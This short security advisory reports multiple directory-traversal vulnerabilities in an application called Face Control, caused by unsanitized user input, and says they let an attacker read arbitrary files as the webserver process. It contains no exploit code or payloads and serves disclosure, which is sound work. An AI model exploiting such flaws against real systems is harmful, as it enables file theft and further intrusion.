Face Control is prone to multiple directory-traversal vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.

An attacker can exploit these vulnerabilities to retrieve arbitrary files from the vulnerable system in the context of the webserver process. Information obtained may aid in further attacks; other attacks are also possible.
